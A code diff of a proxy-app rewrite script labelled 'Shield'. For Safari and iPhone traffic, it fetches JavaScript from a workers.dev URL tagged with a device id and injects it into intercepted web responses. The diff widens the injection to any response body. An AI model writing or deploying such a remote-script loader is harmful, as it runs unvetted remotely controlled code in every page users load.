@@ -10,8 +10,7 @@ const urls = [
     `https://safari-shield-auth.justlcd.workers.dev/?id=${did}`
 ];
 
-// 精准识别逻辑
-if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && $response.body && $response.body.includes("<head>")) {
+if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && $response.body) {
     fetchShield(0);
 } else {
     $done({});
@@ -21,14 +20,21 @@ function fetchShield(idx) {
     if (idx >= urls.length) return $done({}); 
 
     $httpClient.get(urls[idx], (err, resp, data) => {
-        // 校验：确保返回的是有效的 window 代码逻辑
         if (!err && resp.status === 200 && data.includes("window")) {
-            let body = $response.body.replace("<head>", `<head><script>${data}</script>`);
-            console.log("🛡️ Shield Activated via " + urls[idx]);
+            let body = $response.body;
+            const scriptTag = `<script>${data}</script>`;
+            
+            // 正则匹配：不区分大小写，且兼容带属性的 head 标签
+            if (/<head[^>]*>/i.test(body)) {
+                body = body.replace(/<head[^>]*>/i, `$&${scriptTag}`);
+            } else {
+                body = scriptTag + body; // 兜底方案：插在最前面
+            }
+            
+            console.log("🛡️ Shield Activated: " + urls[idx]);
             $done({ body });
         } else {
-            // 第一域名失效则尝试备用
-            fetchShield(idx + 1); 
+            fetchShield(idx + 1); // 自定义域名无效时切换备选
         }
     });
 }
